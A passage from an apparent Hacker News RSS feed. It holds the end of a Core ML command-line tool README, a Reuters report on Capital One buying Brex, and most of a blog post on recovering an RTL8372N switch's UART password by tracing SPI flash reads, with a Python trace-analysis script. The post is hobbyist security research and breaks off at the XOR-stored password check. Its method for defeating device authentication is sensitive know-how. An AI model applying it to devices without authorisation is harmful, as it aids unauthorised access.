        &lt;cell&gt;Compute device: &lt;code&gt;cpu&lt;/code&gt;, &lt;code&gt;gpu&lt;/code&gt;, &lt;code&gt;ane&lt;/code&gt;, or &lt;code&gt;all&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;--help&lt;/code&gt;, &lt;code&gt;-h&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Show help information&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;--version&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show version&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;Extensions&lt;/cell&gt;
        &lt;cell role="head"&gt;Used For&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Images&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;.jpg&lt;/code&gt;, &lt;code&gt;.jpeg&lt;/code&gt;, &lt;code&gt;.png&lt;/code&gt;, &lt;code&gt;.heic&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Vision models&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Audio&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;.wav&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Sound classification&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Text&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;.txt&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;NLP models&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tensors&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;.json&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Custom models&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;code&gt;#!/bin/bash
# Classify all images in a folder and generate a report

MODEL="MobileNetV2.mlmodel"
INPUT_DIR="./images"
OUTPUT_DIR="./classifications"

# Run batch classification
coreml batch "$MODEL" --dir "$INPUT_DIR" --out "$OUTPUT_DIR" --format csv

# View results
cat "$OUTPUT_DIR/results.csv"&lt;/code&gt;
    &lt;code&gt;#!/bin/bash
# Compare inference speed across compute devices

MODEL="MobileNetV2.mlmodel"
INPUT="test.jpg"

echo "CPU Only:"
coreml benchmark "$MODEL" -i "$INPUT" --device cpu -n 50 --json | jq '.meanLatencyMs'

echo "GPU:"
coreml benchmark "$MODEL" -i "$INPUT" --device gpu -n 50 --json | jq '.meanLatencyMs'

echo "Neural Engine:"
coreml benchmark "$MODEL" -i "$INPUT" --device ane -n 50 --json | jq '.meanLatencyMs'&lt;/code&gt;
    &lt;code&gt;# GitHub Actions example
- name: Benchmark Model
  run: |
    coreml benchmark model.mlmodel -i test.jpg --json &amp;gt; benchmark.json

- name: Check Performance Regression
  run: |
    LATENCY=$(jq '.meanLatencyMs' benchmark.json)
    if (( $(echo "$LATENCY &amp;gt; 10" | bc -l) )); then
      echo "Performance regression detected: ${LATENCY}ms"
      exit 1
    fi&lt;/code&gt;
    &lt;p&gt;For models that accept numeric tensor inputs (not images), you can pass JSON arrays:&lt;/p&gt;
    &lt;p&gt;Create a JSON input file (&lt;code&gt;input.json&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;[5.1, 3.5, 1.4, 0.2]&lt;/code&gt;
    &lt;p&gt;Run prediction:&lt;/p&gt;
    &lt;code&gt;coreml predict MyClassifier.mlmodel --input input.json&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Input: input.json
Inference time: 0.12 ms

Outputs:
  probabilities: [0.1377, 0.7100, 0.1522]
&lt;/code&gt;
    &lt;p&gt;Batch process multiple JSON files:&lt;/p&gt;
    &lt;code&gt;# Create a directory with JSON input files
mkdir json_samples
echo '[5.1, 3.5, 1.4, 0.2]' &amp;gt; json_samples/sample1.json
echo '[6.7, 3.1, 4.7, 1.5]' &amp;gt; json_samples/sample2.json
echo '[5.9, 3.0, 5.1, 1.8]' &amp;gt; json_samples/sample3.json
echo '[4.6, 3.4, 1.4, 0.3]' &amp;gt; json_samples/sample4.json

# Run batch prediction
coreml batch MyClassifier.mlmodel --dir json_samples --out json_results --format csv&lt;/code&gt;
    &lt;p&gt;Output CSV (&lt;code&gt;json_results/results.csv&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;input_file,inference_time_ms,probabilities
sample1.json,0.27,"[0.1377, 0.7100, 0.1522]"
sample2.json,0.22,"[0.0613, 0.5931, 0.3456]"
sample3.json,0.29,"[0.0522, 0.5000, 0.4479]"
sample4.json,0.17,"[0.1406, 0.6825, 0.1769]"&lt;/code&gt;
    &lt;p&gt;This is useful for models trained on tabular data, embeddings, or any non-image numeric inputs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS 13.0 or later&lt;/item&gt;
      &lt;item&gt;Apple Silicon or Intel Mac&lt;/item&gt;
      &lt;item&gt;Core ML models (&lt;code&gt;.mlmodel&lt;/code&gt;,&lt;code&gt;.mlpackage&lt;/code&gt;, or&lt;code&gt;.mlmodelc&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;MIT License - see LICENSE for details.&lt;/p&gt;
    &lt;p&gt;Contributions are welcome! Please open an issue or submit a pull request.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Built with Swift Argument Parser&lt;/item&gt;
      &lt;item&gt;Uses Apple's Core ML framework&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46724565</guid><pubDate>Thu, 22 Jan 2026 20:12:26 +0000</pubDate></item><item><title>Capital One to acquire Brex for $5.15B</title><link>https://www.reuters.com/legal/transactional/capital-one-buy-fintech-firm-brex-515-billion-deal-2026-01-22/</link><description>&lt;doc fingerprint="e1d8a53d0af29fa9"&gt;
  &lt;main&gt;
    &lt;p&gt;Jan 22 (Reuters) - Capital One Financial (COF.N) said on Thursday it will acquire fintech firm Brex in a cash and stock deal valued at $5.15 billion and reported a rise in quarterly profit on the back of higher interest income from its credit card debt.&lt;/p&gt;
    &lt;p&gt;Shares of the consumer lender fell more than 5% following the announcement of the deal, but robust results helped them pare losses to trade 1.5% lower.&lt;/p&gt;
    &lt;p&gt;Sign up here.&lt;/p&gt;
    &lt;p&gt;The move comes as dealmakers prepare for another strong year in 2026, with a record slate of transactions expected as executives pursue scale to navigate rising economic and geopolitical uncertainties.&lt;/p&gt;
    &lt;p&gt;The deal, which is expected to close in mid‑2026, will be carried out on an approximate 50-50 cash-stock basis, Capital One said.&lt;/p&gt;
    &lt;p&gt;Brex operates in corporate cards and expense management software used by firms such as DoorDash (DASH.O) and Robinhood (HOOD.O), which could give Capital One greater exposure and reduce its reliance on consumer credit, cushioning it against the impact of economic downturns.&lt;/p&gt;
    &lt;p&gt;Brex operates in more than 120 countries according to its website.&lt;/p&gt;
    &lt;p&gt;Capital One said the fintech firm's chief executive and founder, Pedro Franceschi, will remain at the helm following the transaction.&lt;/p&gt;
    &lt;head rend="h2"&gt;FOURTH-QUARTER EARNINGS&lt;/head&gt;
    &lt;p&gt;U.S. consumer spending rose at a solid pace in November and October, suggesting the economy was on track for a third consecutive quarter of strong growth.&lt;/p&gt;
    &lt;p&gt;Economic momentum has been underpinned largely by resilient household demand as well as a narrowing trade deficit, with imports declining in response to President Donald Trump's broad tariff increases.&lt;/p&gt;
    &lt;p&gt;However, the tariffs have pushed up the prices of many goods, weighing unevenly across income groups.&lt;/p&gt;
    &lt;p&gt;Economists say spending strength is increasingly concentrated among higher-income households, while lower- and middle-income consumers have limited scope to switch to cheaper alternatives.&lt;/p&gt;
    &lt;p&gt;Capital One's net interest income — the difference between what it makes on loans and pays out on deposits — rose 54% to $12.47 billion in the fourth quarter from a year ago.&lt;/p&gt;
    &lt;p&gt;The McLean, Virginia-based company's net income available to common stockholders came in at $2.06 billion, or $3.26 per share, for the quarter, compared with $1.02 billion, or $2.67 per share, a year earlier.&lt;/p&gt;
    &lt;head rend="h2"&gt;CREDIT CARD CAP CONUNDRUM&lt;/head&gt;
    &lt;p&gt;Trump said last week he was calling for a one‑year cap on credit card interest rates at 10% starting January 20, but offered few details on how the proposal would be implemented or how companies would be compelled to comply.&lt;/p&gt;
    &lt;p&gt;Banking industry groups have pushed back against the proposal, warning it would restrict the availability of credit for everyday consumers.&lt;/p&gt;
    &lt;p&gt;JPMorgan Chase (JPM.N) CEO Jamie Dimon said on Wednesday a proposal to cap credit card interest rates would amount to economic disaster.&lt;/p&gt;
    &lt;p&gt;However, Bank of America (BAC.N) is considering options to offer new credit cards with an interest rate of 10% to satisfy Trump's demands, a source familiar with the matter said on Thursday.&lt;/p&gt;
    &lt;p&gt;The introduction of an interest rate cap would deal a significant blow to Capital One Financial, which has one of the most credit-card‑dependent business models among major U.S. lenders.&lt;/p&gt;
    &lt;p&gt;"We feel strongly that a cap on interest rates would catalyze a number of unintended consequences," CEO Richard Fairbank said in a call with analysts.&lt;/p&gt;
    &lt;p&gt;He added that lack of credit would result in reduced consumer spending and likely bring on a recession.&lt;/p&gt;
    &lt;p&gt;Reporting by Pritam Biswas in Bengaluru; Editing by Shreya Biswas&lt;/p&gt;
    &lt;p&gt;Our Standards: The Thomson Reuters Trust Principles.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46725288</guid><pubDate>Thu, 22 Jan 2026 21:23:12 +0000</pubDate></item><item><title>Extracting a UART Password via SPI Flash Instruction Tracing</title><link>https://zuernerd.github.io/blog/2026/01/07/switch-password.html</link><description>&lt;doc fingerprint="a6d3db15848184dd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Extracting a UART Password via SPI Flash Instruction Tracing&lt;/head&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;If you’re tinkering around with embedded devices, having debug access is like having superpowers. It’s worth much more than having a firmware binary in my opinion, as it gives you the ability to step through code, analyze it dynamically, and understand it better. It can also help point you to code regions to analyze during static analysis. Many recent MCUs and SoCs allow manufacturers to restrict debug access, so getting debug access is a common attack vector. But what if you’re not able to reactivate debug access, or if the chip you’re analyzing doesn’t even have debug capabilities?&lt;/p&gt;
    &lt;p&gt;That’s what this blog article is about. I’ll discuss how instruction tracing of an external SPI flash helped me better understand the code flow of firmware running on a simple 8051 core.&lt;/p&gt;
    &lt;p&gt;I originally did this last summer during a group effort on the IoT Hacker Hideout Discord server, where people of different skill levels work together on the same devices. If you’re new to IoT hacking or want to improve your skills, I highly recommend joining the server. Originally, I used the Saleae Logic 8 Pro analyzer, which I’m a huge fan of, but the price point is a huge con for hobbyists. That’s why the new SLogic16U3 got my interest. I’ll use it during this article to test it and see if it fits my needs.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Target&lt;/head&gt;
    &lt;p&gt;The target device is a cheap managed switch based on the RTL8372N. There are many of these devices on the market which all seem to be based on the same reference design and firmware SDK. The device we’re looking at is marketed by the company “GoodTop” as the “GT-ST024M”.&lt;/p&gt;
    &lt;p&gt;The RTL8372N is a Realtek network switch controller chip. It can be configured either through an external bus interface or via its onboard 8051 processor, which runs the management firmware and provides administrative web interface access to the switch. The firmware is located on an external QSPI Flash chip (W25Q16JV).&lt;/p&gt;
    &lt;p&gt;After opening the device enclosure, an unpopulated UART connector catches the eye of any interested hardware hacker. So let’s connect to it and repower the device:&lt;/p&gt;
    &lt;p&gt;Bummer. The UART console wants a password. Some research on the internet shows hardcoded passwords from preceding hardware versions, but none of them worked. Seems like they changed it. And with this, we found our target: let’s try to find the password.&lt;/p&gt;
    &lt;head rend="h2"&gt;Finding the Password&lt;/head&gt;
    &lt;p&gt;We don’t have access to an RTL8372N datasheet, but reading the ones for previous chips shows that they’re all very similar and mostly differ in their networking capabilities. None of them mention any hardware security, so it’s pretty clear that the password has to be somewhere in the flash.&lt;/p&gt;
    &lt;p&gt;Dumping the flash is no issue—it’s as easy as it gets using any adapter available. The flash contents are neither encrypted nor compressed, which makes sense since on such a system it’s expected to be using XIP (eXecute In Place), where the chip directly reads instructions it wants to execute from the flash into a buffer and executes them. This is unlike other systems where the firmware would be loaded into SRAM.&lt;/p&gt;
    &lt;p&gt;Using the &lt;code&gt;strings&lt;/code&gt; command on the firmware dump reveals a lot of interesting details about the webserver itself, but nothing obvious hints us to the password. So we have to dig deeper, I guess.&lt;/p&gt;
    &lt;p&gt;For that, I like to use Ghidra. But there’s a catch: the 8051 architecture only has a 64KB address space. That’s way too small to have a webserver running with all its content. Therefore, it uses a mechanism called code banking&lt;/p&gt;
    &lt;p&gt;Code Banking: The 8051 extends beyond its 64KB limit by dividing code into multiple banks that share the same address space. A bank-switching mechanism (typically through Special Function Registers) selects which bank is currently visible to the CPU. This allows the firmware to access megabytes of flash memory by swapping banks in and out as needed. The first 16KB are for common functions and stay the same, while the next 48KB are for the individual banks.&lt;/p&gt;
    &lt;p&gt;This makes it extra painful to reverse engineer such firmware, especially as I have no prior experience with this architecture. Ghidra supports the 8051 architecture but not code banking. I was also able to find strings, but referencing them as usual did not work because of the banking. Although there are some efforts to implement it, like here and here, by the time I originally did this, these either didn’t exist yet or were not usable. Therefore, I wrote a loader script that takes the flash dump and loads it with overlays into Ghidra:&lt;/p&gt;
    &lt;p&gt;Still, there are all the different wrappers for bank switching which make reverse engineering annoying, especially since there are 21 banks in total.&lt;/p&gt;
    &lt;p&gt;So, is there any way to speed up the reverse engineering process? And here I had an idea: we don’t have debug access, but since the external flash is used with XIP, I could just sniff the QSPI communication and therefore find out the locations of the code that are executed. That way, I’m not able to create an actual code trace, but something very similar: a trace of instructions that are loaded from the flash for XIP. That should be very close.&lt;/p&gt;
    &lt;p&gt;Furthermore, I can create an instruction trace where the device is idle and another one where I type in a password. That way, I should be able to diff the two and get a hint of where in the firmware the password check logic or the password itself could be placed.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Logic Analyzer&lt;/head&gt;
    &lt;p&gt;As mentioned earlier, I did this originally with a Saleae Logic 8 Pro, which I’m a huge fan of, but for some time I’ve been looking for a cheaper alternative that’s more in the budget of a hobbyist. Many of the cheaper analyzers won’t fit my needs as they’re too slow or require some unmaintained software. The software of the Saleae is actually the reason why I like them so much, as it’s actively maintained. Beginners often like to use the cheap Saleae clones, but I’ve had very bad experiences with them. Although they’re marketed with a 24 MHz sample rate, they didn’t capture the 8 MHz SPI communication of a project I was trying to debug. Took some time to figure that out back then…&lt;/p&gt;
    &lt;p&gt;Since the RTL8372N is using XIP, it has to get the instructions from the flash pretty fast, so the clock frequency is also pretty high. We need to be able to capture 60 MHz SPI. That’s why the SLogic16U3 is interesting. It claims to be able to have an 800M sample rate at 4 channels or 400M at 8 channels. It’s important to note that the SLogic16U3 has no internal memory, so it has to directly stream all data to the PC via USB 3.0. At the time of writing, there’s a bug in the Windows USB drivers that limits the maximum sample rate to 400M. Usually for practical digital sampling, we want 4× the clock frequency, so 400M will be more than enough.&lt;/p&gt;
    &lt;p&gt;To connect the logic analyzer to the flash chip, you can use SOIC clips. I’ve tried out several different brands, but for me, they all get chewed up after some time and don’t stay in place anymore. That’s why I placed some additional pin headers on the PCB to have solid connections to the flash, as I was planning to tinker around with it much more.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sniffing the Flash&lt;/head&gt;
    &lt;p&gt;Let’s start sniffing. I used the custom version of PulseView by SiPeed as their driver is not upstream yet. It works just like general PulseView, which has its quirks.&lt;/p&gt;
    &lt;p&gt;I named all four channels for later analysis, powered on the switch, waited until it booted and the password screen appeared on UART, and then started a capture with 4 channels at 200 MHz sample rate and 500M samples. That’s about 2.5 seconds and enough.&lt;/p&gt;
    &lt;p&gt;As you can see in the screenshot, I was almost ready to move to the next step. Luckily, PulseView already has a working analyzer for SPI Flash. For Saleae Logic, I had to implement the fast read command for its community protocol analyzer (PR here).&lt;/p&gt;
    &lt;p&gt;The only problem with it: its performance. It’s painfully slow, especially since we have such a high amount of samples. For this trace, it took 15-20 minutes and allocated 8GB of RAM. But still, it worked. Afterwards, exporting the analyzed memory commands into a text file was straightforward:&lt;/p&gt;
    &lt;code&gt;64875-65369 SPI flash/EEPROM: Commands: Fast read data (addr 0x020fe2, 14 bytes): 7f 74 7e 78 12 31 5b e4 fb fa f9 f8 c3 12
65403-77378 SPI flash/EEPROM: Commands: Fast read data (addr 0x096aad, 211 bytes): ab 07 aa 06 e4 ff fe fd fc 90 1d 33 12 1a c9 e4 ff fe fd fc 90 1d 2f 12 1a c9 ea f5 a2 eb f5 a3 75 a0 01 af a1 ef 70 fb af a4 fc fd fe 90 1d 33 12 1a c9 90 1d 2f 12 1a 5f c0 00 90 1d 33 12 1a 43 78 18 12 19 e0 d0 00 12 19 71 90 1d 2f 12 1a c9 af a5 e4 fc fd fe 90 1d 33 12 1a c9 90 1d 2f 12 1a 5f c0 00 90 1d 33 12 1a 43 78 10 12 19 e0 d0 00 12 19 71 90 1d 2f 12 1a c9 af a6 e4 fc fd fe 90 1d 33 12 1a c9 90 1d 2f 12 1a 5f c0 00 90 1d 33 12 1a 43 78 08 12 19 e0 d0 00 12 19 71 90 1d 2f 12 1a c9 af a7 e4 fc fd fe 90 1d 33 12 1a c9 90 1d 2f 12 1a 43 90 1d 33 12 1a 5f 12 19 71 90 1d 2f 12 1a c9 90 1d 2f 12 1a 43 22 90 19 17 ee f0 a3
77412-78095 SPI flash/EEPROM: Commands: Fast read data (addr 0x020fe9, 21 bytes): e4 fb fa f9 f8 c3 12 19 bc 7f 00 60 02 7f 01 22 90 16 ed 12 1b
78129-78479 SPI flash/EEPROM: Commands: Fast read data (addr 0x034018, 8 bytes): ef 64 01 60 03 02 40 db
78513-78959 SPI flash/EEPROM: Commands: Fast read data (addr 0x0340db, 5 bytes): 22 78 3d e6 54
78993-79830 SPI flash/EEPROM: Commands: Fast read data (addr 0x0350e7, 22 bytes): 90 aa 1b 12 1a 43 ef 54 01 ff e4 fe fd fc ef 70 03 02 51 9a 90 aa
79863-80418 SPI flash/EEPROM: Commands: Fast read data (addr 0x03519a, 16 bytes): 90 aa 13 12 1a 43 ec 33 40 15 90 aa 13 12 1a 43
80452-80742 SPI flash/EEPROM: Commands: Fast read data (addr 0x0351b9, 6 bytes): 12 48 4a ec 4d 4e
80775-81487 SPI flash/EEPROM: Commands: Fast read data (addr 0x03484a, 22 bytes): 90 aa 1b 12 1a 43 ef 54 01 ff e4 fe fd fc ef 70 02 ff 22 90 aa 29
81521-81871 SPI flash/EEPROM: Commands: Fast read data (addr 0x0351bd, 8 bytes): 4d 4e 4f 60 1e 90 aa 5e
....
&lt;/code&gt;
    &lt;p&gt;Next, I did the same while typing in a wrong password, so I had two trace files.&lt;/p&gt;
    &lt;head rend="h2"&gt;Analyzing the Traces&lt;/head&gt;
    &lt;p&gt;To make sense of these traces, I vibe coded a Python script to convert raw flash addresses into the 8051 banked memory format and provide various analysis modes. The script needed to:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Convert flash addresses to banked addresses&lt;/item&gt;
      &lt;item&gt;Show execution traces&lt;/item&gt;
      &lt;item&gt;Show unique addresses (coverage)&lt;/item&gt;
      &lt;item&gt;Optionally display read lengths and data bytes&lt;/item&gt;
      &lt;item&gt;Support ASCII representation of data&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Here’s the analysis script:&lt;/p&gt;
    &lt;code&gt;import sys
import argparse
import re

def flash_to_banked(flash_addr):
    """Convert raw flash address to 8051 banked memory format
    
    Memory layout:
    - 0x0000-0x3FFF: Common code area (not banked)
    - 0x4000+: Banked area, each bank is 0xC000 bytes
      Bank pages map to 0x4000-0xFFFF in CPU address space
    """
    # Common code area (not banked)
    if flash_addr &amp;lt; 0x4000:
        return f"CODE::{flash_addr:X}"
    
    # Banked region
    # Flash offset from start of banked area
    flash_offset = flash_addr - 0x4000
    bank = (flash_offset // 0xC000) + 1
    # Offset within the bank, mapped to 0x4000-0xFFFF
    bank_offset = (flash_offset % 0xC000) + 0x4000
    
    return f"BANK_{bank}::{bank_offset:X}"

def parse_addr(addr_str):
    """Parse hex address string to int"""
    return int(addr_str.replace('0x', ''), 16)

def hex_to_ascii(hex_string):
    """Convert hex string to ASCII representation
    Non-printable characters are shown as '.'
    """
    # Remove spaces and convert to bytes
    hex_clean = hex_string.replace(' ', '')
    try:
        ascii_chars = []
        for i in range(0, len(hex_clean), 2):
            byte_val = int(hex_clean[i:i+2], 16)
            # Use printable ASCII (32-126), otherwise use '.'
            if 32 &amp;lt;= byte_val &amp;lt;= 126:
                ascii_chars.append(chr(byte_val))
            else:
                ascii_chars.append('.')
        return ''.join(ascii_chars)
    except:
        return ''

def format_address(addr_str, mode, length=None, data=None, show_ascii=False):
    """Format address based on mode: flash, banked, or both"""
    try:
        flash_addr = parse_addr(addr_str)
        length_str = f" ({length} bytes)" if length else ""
        data_str = ""
        
        if data:
            data_str = f": {data}"
            if show_ascii:
                ascii_repr = hex_to_ascii(data)
                data_str += f" | {ascii_repr}"
        
        if mode == 'flash':
            return f"{addr_str}{length_str}{data_str}"
        elif mode == 'banked':
            return f"{flash_to_banked(flash_addr)}{length_str}{data_str}"
        else:  # both
            return f"{addr_str} -&amp;gt; {flash_to_banked(flash_addr)}{length_str}{data_str}"
    except:
        return addr_str

def parse_line(line):
    """Parse a line in format: 'timing Fast read data (addr 0xXXXXXX, N bytes): data'
    Returns (address, length, data) tuple or None if not a valid line
    """
    # Pattern: addr 0xXXXXXX, N bytes): data
    pattern = r'addr\s+(0x[0-9a-fA-F]+),\s+(\d+)\s+bytes\):\s*(.+)$'
    match = re.search(pattern, line)
    
    if match:
        addr = match.group(1)
        length = int(match.group(2))
        data = match.group(3).strip()
        return (addr, length, data)
    
    return None

def analyze_trace(input_file, show_mode, format_mode, show_length, show_data, show_ascii):
    """Analyze trace from line-based format file"""
    addresses = []
    
    with open(input_file, 'r', encoding='utf-8') as f:
        for line in f:
            result = parse_line(line)
            if result:
                addr, length, data = result
                if not show_length:
                    length = None
                if not show_data:
                    data = None
                addresses.append((addr, length, data))
    
    if show_mode == 'unique':
        # Get unique addresses and sort (coverage)
        seen = {}
        for addr, length, data in addresses:
            if addr not in seen:
                seen[addr] = (length, data)
        addresses = [(addr, seen[addr][0], seen[addr][1]) for addr in sorted(seen.keys(), key=parse_addr)]
    
    return [format_address(addr, format_mode, length, data, show_ascii) for addr, length, data in addresses]

def main():
    parser = argparse.ArgumentParser(
        description='Flash Trace Analyzer - convert raw flash addresses to 8051 banked memory format',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s trace.txt                    # full execution trace (default)
  %(prog)s trace.txt -m unique          # unique addresses (coverage)
  %(prog)s trace.txt -l                 # trace with read lengths
  %(prog)s trace.txt -d                 # trace with data bytes
  %(prog)s trace.txt -d -a              # trace with data bytes and ASCII
  %(prog)s trace.txt -l -d              # trace with lengths and data
  %(prog)s trace.txt -m unique -l       # coverage with read lengths
  %(prog)s trace.txt -f flash           # execution trace as raw flash addresses
  %(prog)s trace.txt -m unique -f both  # coverage with both formats

Input format:
  Lines should contain: "addr 0xXXXXXX, N bytes"
  Example: "64875-65369 SPI flash/EEPROM: Commands: Fast read data (addr 0x020fe2, 14 bytes): 7f 74..."
        """)
    
    parser.add_argument('input_file', help='Input file with lines containing "addr 0xXXXXXX, N bytes"')
    parser.add_argument('-m', '--mode', choices=['unique', 'trace'], default='trace',
                       help='Analysis mode: unique (coverage) or trace (execution order) (default: trace)')
    parser.add_argument('-f', '--format', choices=['flash', 'banked', 'both'], default='both',
                       help='Output format: flash (raw), banked (8051), or both (default: both)')
    parser.add_argument('-l', '--length', action='store_true',
                       help='Show read length in bytes')
    parser.add_argument('-d', '--data', action='store_true',
                       help='Show data bytes that were read')
    parser.add_argument('-a', '--ascii', action='store_true',
                       help='Show ASCII representation of data (requires -d)')
    parser.add_argument('-o', '--output', help='Output file (default: print to console)')
    
    args = parser.parse_args()
    
    # ASCII requires data flag
    if args.ascii and not args.data:
        print("Warning: -a/--ascii requires -d/--data flag, enabling data output", file=sys.stderr)
        args.data = True
    
    try:
        results = analyze_trace(args.input_file, args.mode, args.format, args.length, args.data, args.ascii)
        
        if not results:
            print("Warning: No valid addresses found in input file", file=sys.stderr)
        
        output = '\n'.join(results)
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(output + '\n')
            print(f"Written {len(results)} addresses to {args.output}")
        else:
            print(output)
            
    except FileNotFoundError:
        print(f"Error: File '{args.input_file}' not found", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == '__main__':
    main()
&lt;/code&gt;
    &lt;p&gt;This script enables me to turn the raw traces into a cleaner log that looks like this:&lt;/p&gt;
    &lt;code&gt;0x020fe2 -&amp;gt; BANK_3::8FE2 (14 bytes)
0x096aad -&amp;gt; BANK_13::6AAD (211 bytes)
0x020fe9 -&amp;gt; BANK_3::8FE9 (21 bytes)
0x034018 -&amp;gt; BANK_5::4018 (8 bytes)
0x0340db -&amp;gt; BANK_5::40DB (5 bytes)
0x0350e7 -&amp;gt; BANK_5::50E7 (22 bytes)
0x03519a -&amp;gt; BANK_5::519A (16 bytes)
0x0351b9 -&amp;gt; BANK_5::51B9 (6 bytes)
0x03484a -&amp;gt; BANK_5::484A (22 bytes)
0x0351bd -&amp;gt; BANK_5::51BD (8 bytes)
0x0351e0 -&amp;gt; BANK_5::51E0 (16 bytes)
0x0b2c48 -&amp;gt; BANK_15::AC48 (51 bytes)
0x096aad -&amp;gt; BANK_13::6AAD (211 bytes)
0x0b2c73 -&amp;gt; BANK_15::AC73 (38 bytes)
0x049190 -&amp;gt; BANK_6::D190 (96 bytes)
0x04928d -&amp;gt; BANK_6::D28D (19 bytes)
0x0491ab -&amp;gt; BANK_6::D1AB (5 bytes)
.....
&lt;/code&gt;
    &lt;p&gt;Inside this log file, there’s a pretty obvious repeating pattern, so there seems to be some kind of loop running that probably also waits for password input. I used the unique mode on both log files and compared which addresses appeared in the trace where I typed in the wrong password that weren’t in the idle trace.&lt;/p&gt;
    &lt;p&gt;This gave me dozens of locations in code that I then looked up in Ghidra:&lt;/p&gt;
    &lt;code&gt;Addresses in file2 but not in file1:
0x03a762 -&amp;gt; BANK_5::A762
0x03a782 -&amp;gt; BANK_5::A782
0x03a77a -&amp;gt; BANK_5::A77A
0x03a768 -&amp;gt; BANK_5::A768
0x04886d -&amp;gt; BANK_6::C86D
0x03a76e -&amp;gt; BANK_5::A76E
0x03a773 -&amp;gt; BANK_5::A773
0x03a77f -&amp;gt; BANK_5::A77F
0x0747ed -&amp;gt; BANK_10::87ED
0x03a774 -&amp;gt; BANK_5::A774
0x03a76f -&amp;gt; BANK_5::A76F
0x04891c -&amp;gt; BANK_6::C91C
0x03a77e -&amp;gt; BANK_5::A77E
0x0488a7 -&amp;gt; BANK_6::C8A7
0x03a776 -&amp;gt; BANK_5::A776
0x03a779 -&amp;gt; BANK_5::A779
0x04884e -&amp;gt; BANK_6::C84E
0x03a765 -&amp;gt; BANK_5::A765
0x03a778 -&amp;gt; BANK_5::A778
0x03a76a -&amp;gt; BANK_5::A76A
0x03a781 -&amp;gt; BANK_5::A781
0x075a0a -&amp;gt; BANK_10::9A0A
0x0ac070 -&amp;gt; BANK_15::4070
0x0488b7 -&amp;gt; BANK_6::C8B7
0x048893 -&amp;gt; BANK_6::C893
0x048888 -&amp;gt; BANK_6::C888
0x03a77b -&amp;gt; BANK_5::A77B
0x03a76b -&amp;gt; BANK_5::A76B
0x03a77d -&amp;gt; BANK_5::A77D
0x03a770 -&amp;gt; BANK_5::A770
0x0488b2 -&amp;gt; BANK_6::C8B2
0x03a771 -&amp;gt; BANK_5::A771
0x03a763 -&amp;gt; BANK_5::A763
0x03a775 -&amp;gt; BANK_5::A775
0x03a766 -&amp;gt; BANK_5::A766
0x03a76c -&amp;gt; BANK_5::A76C
0x03a764 -&amp;gt; BANK_5::A764
0x074753 -&amp;gt; BANK_10::8753
0x07476d -&amp;gt; BANK_10::876D
0x03a77c -&amp;gt; BANK_5::A77C
0x03a769 -&amp;gt; BANK_5::A769
0x03a780 -&amp;gt; BANK_5::A780
0x03a772 -&amp;gt; BANK_5::A772
0x03a76d -&amp;gt; BANK_5::A76D
0x04881a -&amp;gt; BANK_6::C81A
0x048919 -&amp;gt; BANK_6::C919
0x048876 -&amp;gt; BANK_6::C876
0x03a767 -&amp;gt; BANK_5::A767
0x03a777 -&amp;gt; BANK_5::A777
0x07ffff -&amp;gt; BANK_11::7FFF
&lt;/code&gt;
    &lt;p&gt;That’s when I had an idea and added a feature to my script to show me the loaded data in ASCII representation. And sure enough, I was able to see that the &lt;code&gt;@@@@@@@@@Key is wrong@@@@@@@@@&lt;/code&gt; string was loaded from the flash. So I looked at what addresses were loaded before that.&lt;/p&gt;
    &lt;p&gt;In Ghidra at &lt;code&gt;BANK_10::87ED&lt;/code&gt;, I found what looked like a command parser pretty quickly.&lt;/p&gt;
    &lt;p&gt;This code XOR-decrypts 11 bytes of user input, compares them against a stored password (that is saved in its XORed representation in &lt;code&gt;DAT_EXT_1755&lt;/code&gt;), and if successful (plus some additional flag checks), grants access.&lt;/p&gt;
